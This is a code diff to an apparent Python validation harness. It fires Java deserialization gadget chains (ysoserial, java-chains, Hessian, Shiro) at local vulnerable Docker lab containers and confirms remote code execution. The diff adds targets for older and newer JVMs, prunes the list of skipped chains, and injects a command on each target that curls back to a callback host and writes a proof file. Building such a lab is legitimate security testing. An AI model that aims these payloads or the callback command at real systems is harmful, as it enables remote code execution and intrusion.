@@ -14,7 +14,7 @@ OOB_HOST is the IP that CT2 containers use to call back to CT1.
   Default: 192.168.65.254 (host.docker.internal on Windows Docker Desktop)
 """
 
-import os, sys, time, json, base64, struct, threading, urllib.request, urllib.error, urllib.parse
+import os, sys, time, json, base64, struct, threading, subprocess, urllib.request, urllib.error, urllib.parse
 from datetime import datetime
 
 # ── Config ────────────────────────────────────────────────────────────────────
@@ -22,6 +22,11 @@ OOBSERVER   = os.getenv("OOBSERVER_URL",  "http://localhost:8010")
 VULNLAB     = os.getenv("VULNLAB_URL",    "http://localhost:8888")
 LOG4SHELL   = os.getenv("LOG4SHELL_URL",  "http://localhost:8081")
 SHIRO_URL   = os.getenv("SHIRO_URL",      "http://localhost:8082")
+JAVA8OLD_URL = os.getenv("JAVA8OLD_URL",  "http://localhost:8891")  # Java 8u65: cc1/cc3/jrmp
+JAVA7_URL   = os.getenv("JAVA7_URL",      "http://localhost:8892")  # Java 7: jdk7u21
+JAVA17_URL  = os.getenv("JAVA17_URL",     "http://localhost:8893")  # Java 17: jdk17 chains
+SPRING3_URL = os.getenv("SPRING3_URL",    "http://localhost:8894")  # Spring 3.0.5: spring1/2
+CB2_URL     = os.getenv("CB2_URL",        "http://localhost:8895")  # BeanUtils 1.8.3: cb2
 OOB_HOST    = os.getenv("OOB_HOST",       "host.docker.internal")
 OOB_HTTP    = int(os.getenv("OOB_HTTP",   "8010"))
 OOB_LDAP    = int(os.getenv("OOB_LDAP",   "1389"))
@@ -32,11 +37,27 @@ POLL_SEC    = int(os.getenv("POLL_SEC",   "12"))   # seconds to wait for callbac
 C2_WAIT     = int(os.getenv("C2_WAIT",   "40"))    # seconds to wait for C2 agent
 
 # Callback URL the target can reach to prove OOB/RCE
+# IMPORTANT: curl -o /tmp/oobx_TOKSHORT saves response to file = dual proof (callback + file)
+# Works with both Runtime.exec(String) splitting by spaces AND shell execution
 CALLBACK_BASE = f"http://{OOB_HOST}:{OOB_HTTP}/callback/http"
-CURL_CMD = lambda tok: f"curl -sk {CALLBACK_BASE}/{tok}/rce"
-WGET_CMD = lambda tok: f"wget -q -O/dev/null {CALLBACK_BASE}/{tok}/rce"
-# Use plain curl — Runtime.exec(String) cannot handle shell operators like ()/||/&
-EXEC_CMD = lambda tok: CURL_CMD(tok)
+EXEC_CMD = lambda tok: f"curl -sk {CALLBACK_BASE}/{tok}/rce -o /tmp/oobx_{tok[:12]}"
+
+# ── RCE file verification via docker exec ─────────────────────────────────────
+
+def verify_rce_file(container_name, tok):
+    """Verify file /tmp/oobx_TOKSHORT was created on target container."""
+    fpath = f"/tmp/oobx_{tok[:12]}"
+    try:
+        r = subprocess.run(
+            ["docker", "exec", container_name, "test", "-f", fpath],
+            capture_output=True, timeout=5)
+        if r.returncode == 0:
+            print(f"    [★] RCE file confirmed: {fpath} exists on {container_name}")
+            return True
+    except Exception:
+        pass
+    # Fallback: query /check-rce endpoint on supported targets
+    return False
 
 # ── State ─────────────────────────────────────────────────────────────────────
 TOKEN   = None      # JWT
@@ -198,90 +219,41 @@ def check_target(url, name):
 
 # Chains that are expected to fail due to version/JVM incompatibility
 KNOWN_SKIP = {
-    # CC1/CC3: AnnotationInvocationHandler patched in Java 8u232+
-    "ysoserial_cc1":        "Java 8u232+ patch (AnnotationInvocationHandler)",
-    "ysoserial_cc3":        "Java 8u232+ patch (AnnotationInvocationHandler)",
-    # CC2/CC4: need commons-collections4 on target, not CC3
-    "ysoserial_cc2":        "Requires commons-collections4 on target classpath",
-    "ysoserial_cc4":        "Requires commons-collections4 on target classpath",
-    # Spring1/2: serialVersionUID mismatch with target Spring version
-    "ysoserial_spring1":    "Spring SerializableTypeWrapper serialVersionUID mismatch",
-    "ysoserial_spring2":    "Spring SerializableTypeWrapper serialVersionUID mismatch",
-    # Hibernate1: hibernate-core not in vulnlab classpath
-    "ysoserial_hibernate1": "hibernate-core not on target classpath",
-    # JDK7u21: requires Java 7, incompatible with Java 8 target
-    "ysoserial_jdk7u21":    "Requires Java 7 (sun.reflect.annotation.AnnotationType)",
-    # CB2: BeanUtils serialVersionUID mismatch (1.8.x vs 1.9.x)
-    "jchains_native_cb2":   "BeanUtils serialVersionUID mismatch (1.8.x vs 1.9.4)",
-    # JDK17 chains: target is Java 8, these need Java 17+ gadget classes
-    "jchains_native_jdk17_1": "Requires Java 17+ target (EventListenerList)",
-    "jchains_native_jdk17_2": "Requires Java 17+ target (TextAndMnemonicHashMap)",
-    # hessian1_spring via marshalsec only generates Hessian2 format; use jchains_hessian1_spring
-    "hessian1_spring":      "marshalsec only supports Hessian2; use jchains_hessian1_spring",
-    # JNDI ResourceRef chains are server-side JNDI responses, not injection payloads
-    "jchains_jndi_tomcat_el":   "Server-side JNDI response payload (not direct-inject)",
-    "jchains_jndi_groovy":      "Server-side JNDI response payload (not direct-inject)",
-    "jchains_jndi_snakeyaml":   "Server-side JNDI response payload (not direct-inject)",
-    "jchains_jndi_beanshell":   "Server-side JNDI response payload (not direct-inject)",
-    # H2 JDBC: java-chains H2JavaJdbc1+BytecodeConvert+Exec — Exec gadget hardcodes cmd='calc'
-    "jchains_h2_jdbc":          "java-chains Exec bug: cmd hardcoded 'calc' in H2 INIT SQL",
-    # BlazeDS/Axis2: invalid stream format — needs AMF3 endpoint
-    "jchains_blazeds_axis2":    "Requires AMF3/BlazeDS endpoint (not native deser)",
+    # marshalsec format: outputs Hessian1 binary, confused with Hessian2 endpoint
+    "hessian1_spring":      "marshalsec only supports Hessian2 format; use jchains_hessian1_spring",
 
-    # java-chains Exec gadget is broken: hardcodes cmd='calc' AND generates a class
-    # that doesn't implement AbstractTranslet.transform() → InstantiationException
-    # from TemplatesImpl.getTransletInstance(). All BytecodeConvert+Exec chains fail.
-    "jchains_native_cc6":          "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_cc1":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_cc2":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_cc3":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_cc4":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_cc6":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_native_cb1":          "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_native_jackson":      "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_native_k1_secondary": "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
-    "jchains_native_c3p0_el":      "java-chains Exec bug: cmd hardcoded 'calc' (EL path)",
-    # Hessian exec/bcel/secondary/rome chains — all use BytecodeConvert+Exec (same Exec bug)
-    # Plus Hessian exec gadgets use SwingLazyValue which requires UIDefaults.get() to fire
-    # (not triggered by raw HessianInput.readObject())
-    "jchains_hessian1_exec":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian1_secondary": "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian1_bcel":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian1_rome1":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian1_rome2":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian2_exec":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian2_secondary": "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian2_bcel":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian2_rome1":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian2_rome2":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
-    "jchains_hessian2_tostring_jackson": "java-chains Exec bug; Jackson toString secondary",
-    "jchains_hessian2_tostring_xbean":   "java-chains Exec bug; Tomcat EL engine absent in vulnlab",
-    # JRMPClient: JEP 290 RMI deserialization filter (Java 8u121+) blocks non-RMI gadget classes
-    # JRMPListener infrastructure is built (sidecar port 10099), but target is Java 8u342
-    "ysoserial_jrmp_client": "JEP 290 RMI filter blocks CC6 gadget deserialization (Java 8u121+)",
-    # Groovy1: groovy-*.jar not on vulnlab classpath
-    "ysoserial_groovy1":           "groovy-*.jar not on target classpath",
-    # java-chains BytecodeConvert+Exec bug also affects Fastjson/XStream/H2 exec chains
-    "jchains_fastjson_bcel":       "java-chains BytecodeConvert+Exec bug (cmd hardcoded 'calc')",
-    "jchains_fastjson_c3p0_h2":    "java-chains BytecodeConvert+Exec bug (H2 + Exec)",
-    "jchains_xstream_exec":        "java-chains BytecodeConvert+Exec bug (XsltJdk + Exec)",
-    # fastjson_bcel uses com.sun.org.apache.bcel ClassLoader which is blocked in FastJson ≥1.2.25
-    "fastjson_bcel":               "BCEL driverClassLoader blocked in FastJson ≥1.2.25; target uses 1.2.47",
-    # C3P0 LdapClassLoader fails to acquire JNDI InitialContext in restricted JVM config
-    "jchains_native_c3p0_ldap":   "C3P0 JNDI InitialContext creation fails (no LDAP provider in env)",
-    # SpringExec FactoryBean fails on Spring 5.x — gadget requires Spring 4.x
-    "jchains_hessian1_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x on target",
-    "jchains_hessian2_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x on target",
-    # jchains_shiro_cbc: inner chain uses Exec gadget (hardcoded cmd='calc', missing transform())
-    "jchains_shiro_cbc": "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    # JNDI ResourceRef chains: these generate the LDAP *response* payload (not the injection).
+    # Testing requires configuring OOBserver LDAP to serve Reference objects — not yet implemented.
+    "jchains_jndi_tomcat_el":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
+    "jchains_jndi_groovy":      "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
+    "jchains_jndi_snakeyaml":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
+    "jchains_jndi_beanshell":   "Server-side JNDI ResourceRef payload; needs LDAP Reference serving support",
+
+    # BlazeDS/Axis2: requires AMF3 endpoint — no BlazeDS container in current lab
+    "jchains_blazeds_axis2":    "Requires AMF3/BlazeDS target endpoint",
+
+    # SpringExec FactoryBean: requires Spring 4.x; vulnlab has Spring 5.x
+    "jchains_hessian1_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x",
+    "jchains_hessian2_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x",
+
+    # C3P0 LDAP: InitialContext creation fails (no LDAP provider registered in JVM env)
+    "jchains_native_c3p0_ldap":   "C3P0 JNDI InitialContext creation fails (no LDAP provider)",
+
+    # Tomcat EL engine: TomcatElRef requires org.apache.tomcat EL classes — not in vulnlab
+    "jchains_hessian2_tostring_xbean": "Requires Tomcat EL engine (XBean + TomcatElRef)",
+    "jchains_native_c3p0_el":          "Requires Tomcat EL engine (TomcatElRef)",
+
+    # DNS-only — no OOB DNS resolver configured
+    "ysoserial_urldns": "DNS-only chain; no OOB DNS resolver configured",
 }
 
 
-def test_deser_chain(chain_id, params=None):
-    """Generate serialize payload, POST to /deser, check OOB callback."""
+def test_deser_chain(chain_id, params=None, target_url=None, container_name="vuln-vulnlab"):
+    """Generate serialize payload, POST to /deser, check OOB callback + RCE file."""
     if chain_id in KNOWN_SKIP:
         record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
         return
+    url = target_url or VULNLAB
     try:
         tok = new_token(chain_id[:20])
     except Exception as e:
@@ -306,13 +278,17 @@ def test_deser_chain(chain_id, params=None):
     if len(raw) < 4:
         record(chain_id, "ERR ", f"payload too short: {len(raw)} bytes")
         return
-    code, resp = post_raw(f"{VULNLAB}/deser", raw)
+    code, resp = post_raw(f"{url}/deser", raw)
     if code == 0:
-        record(chain_id, "SKIP", f"vulnlab unreachable: {resp[:80]}")
+        record(chain_id, "SKIP", f"target unreachable: {resp[:80]}")
         return
     ok, ev = wait_callback(tok)
     if ok:
-        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}")
+        rce_ok = verify_rce_file(container_name, tok)
+        note = f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}"
+        if rce_ok:
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
+        record(chain_id, "PASS", note)
     else:
         record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")
 
@@ -384,7 +360,11 @@ def test_hessian_chain(chain_id, version=1):
         return
     ok, ev = wait_callback(tok)
     if ok:
-        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')}")
+        rce_ok = verify_rce_file("vuln-vulnlab", tok)
+        note = f"callback from {ev.get('remote_addr','?')}"
+        if rce_ok:
+            note += f" + RCE file ✓"
+        record(chain_id, "PASS", note)
     else:
         record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")
 
@@ -535,7 +515,11 @@ def test_shiro(chain_id):
         return
     ok, ev = wait_callback(tok)
     if ok:
-        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')}")
+        rce_ok = verify_rce_file("vuln-shiro", tok)
+        note = f"callback from {ev.get('remote_addr','?')}"
+        if rce_ok:
+            note += f" + RCE file ✓"
+        record(chain_id, "PASS", note)
     else:
         record(chain_id, "FAIL", f"no callback (http {code})")
 
@@ -882,33 +866,74 @@ def main():
 
     # Check targets
     print("\n[*] Target reachability:")
-    vl_ok  = check_target(VULNLAB,   "vulnlab  :8888")
-    l4_ok  = check_target(LOG4SHELL, "log4shell:8081")
-    sh_ok  = check_target(SHIRO_URL, "shiro    :8082")
+    vl_ok  = check_target(VULNLAB,    "vulnlab     :8888")
+    l4_ok  = check_target(LOG4SHELL,  "log4shell   :8081")
+    sh_ok  = check_target(SHIRO_URL,  "shiro       :8082")
+    j8old_ok = check_target(JAVA8OLD_URL, "java8-old   :8891")
+    j7_ok  = check_target(JAVA7_URL,  "java7       :8892")
+    j17_ok = check_target(JAVA17_URL, "java17      :8893")
+    sp3_ok = check_target(SPRING3_URL,"spring3     :8894")
+    cb2_ok = check_target(CB2_URL,    "cb2         :8895")
 
-    # ── Section 1: ysoserial chains ────────────────────────────────────────────
-    print("\n[*] Section 1: ysoserial chains (→ /deser)")
-    for cid in ["ysoserial_cc1","ysoserial_cc2","ysoserial_cc3",
-                "ysoserial_cc4","ysoserial_cc5","ysoserial_cc6","ysoserial_cc7",
-                "ysoserial_cb1","cb_no_cc","ysoserial_spring1","ysoserial_spring2",
-                "ysoserial_rome","ysoserial_groovy1","ysoserial_hibernate1","ysoserial_jdk7u21"]:
+    # ── Section 1: ysoserial chains (vulnlab — CC3/CC4/CB1 all on classpath) ───
+    print("\n[*] Section 1a: ysoserial chains → vulnlab :8888")
+    for cid in ["ysoserial_cc2","ysoserial_cc4","ysoserial_cc5","ysoserial_cc6","ysoserial_cc7",
+                "ysoserial_cb1","cb_no_cc","ysoserial_rome",
+                "ysoserial_groovy1","ysoserial_hibernate1"]:
         test_deser_chain(cid)
 
-    print("\n[*] ysoserial URLDNS / JRMPClient:")
+    print("\n[*] Section 1b: ysoserial chains needing old JVM → java8-old :8891")
+    # cc1/cc3: need Java < 8u232 (AnnotationInvocationHandler fix)
+    for cid in ["ysoserial_cc1","ysoserial_cc3"]:
+        if j8old_ok:
+            test_deser_chain(cid, target_url=JAVA8OLD_URL, container_name="vuln-java8old")
+        else:
+            record(cid, "SKIP", "java8-old target not running (:8891)")
+
+    print("\n[*] Section 1c: ysoserial_jdk7u21 → java7 :8892")
+    if j7_ok:
+        test_deser_chain("ysoserial_jdk7u21", target_url=JAVA7_URL, container_name="vuln-java7")
+    else:
+        record("ysoserial_jdk7u21", "SKIP", "java7 target not running (:8892)")
+
+    print("\n[*] Section 1d: ysoserial spring1/spring2 → spring3 :8894")
+    for cid in ["ysoserial_spring1","ysoserial_spring2"]:
+        if sp3_ok:
+            test_deser_chain(cid, target_url=SPRING3_URL, container_name="vuln-spring3")
+        else:
+            record(cid, "SKIP", "spring3 target not running (:8894)")
+
+    print("\n[*] URLDNS / JRMPClient:")
     test_urldns("ysoserial_urldns")
-    test_jrmp_client(jrmp_port=int(os.getenv("OOB_JRMP", "10099")))
+    # jrmp_client: routed to java8-old (before JEP 290 at 8u121)
+    if j8old_ok:
+        test_jrmp_client(jrmp_port=int(os.getenv("OOB_JRMP", "10099")))
+    else:
+        record("ysoserial_jrmp_client", "SKIP", "java8-old target not running (JEP 290 blocks on modern JVM)")
 
     # ── Section 2: jchains native deserialization ──────────────────────────────
-    print("\n[*] Section 2: jchains native deserialization (→ /deser)")
+    print("\n[*] Section 2a: jchains native chains → vulnlab :8888")
     for cid in ["jchains_native_cc6","jchains_native_cb1",
-                "jchains_native_cb2","jchains_native_k1_secondary",
+                "jchains_native_k1_secondary",
                 "jchains_cc1","jchains_cc2","jchains_cc3","jchains_cc4","jchains_cc6",
-                "jchains_native_jackson","jchains_native_jdk17_1","jchains_native_jdk17_2",
-                "jchains_native_c3p0_el"]:
+                "jchains_native_jackson","jchains_native_c3p0_el"]:
         test_deser_chain(cid)
     # CB1 JNDI and C3P0 LDAP need jndi_url param (not cmd)
     test_deser_jndi_chain("jchains_native_cb1_jndi")
     test_deser_jndi_chain("jchains_native_c3p0_ldap")
+
+    print("\n[*] Section 2b: jchains jdk17 chains → java17 :8893")
+    for cid in ["jchains_native_jdk17_1","jchains_native_jdk17_2"]:
+        if j17_ok:
+            test_deser_chain(cid, target_url=JAVA17_URL, container_name="vuln-java17")
+        else:
+            record(cid, "SKIP", "java17 target not running (:8893)")
+
+    print("\n[*] Section 2c: jchains_native_cb2 → cb2 :8895")
+    if cb2_ok:
+        test_deser_chain("jchains_native_cb2", target_url=CB2_URL, container_name="vuln-cb2")
+    else:
+        record("jchains_native_cb2", "SKIP", "cb2 target not running (:8895)")
 
     # ── Section 3: Hessian chains ──────────────────────────────────────────────
     print("\n[*] Section 3: Hessian1 chains (→ /hessian)")
@@ -953,11 +978,10 @@ def main():
     if sh_ok:
         test_shiro("shiro_cbc")
         test_shiro("shiro_gcm")
+        test_shiro("jchains_shiro_cbc")  # Exec bug fixed — now testable
     else:
-        for c in ["shiro_cbc","shiro_gcm"]:
+        for c in ["shiro_cbc","shiro_gcm","jchains_shiro_cbc"]:
             record(c, "SKIP", "shiro container not running")
-    # jchains_shiro_cbc is always skipped (java-chains Exec bug)
-    test_shiro("jchains_shiro_cbc")
 
     # ── Section 9: C3P0 / H2 / BlazeDS ───────────────────────────────────────
     print("\n[*] Section 9: C3P0 / H2 / BlazeDS chains")
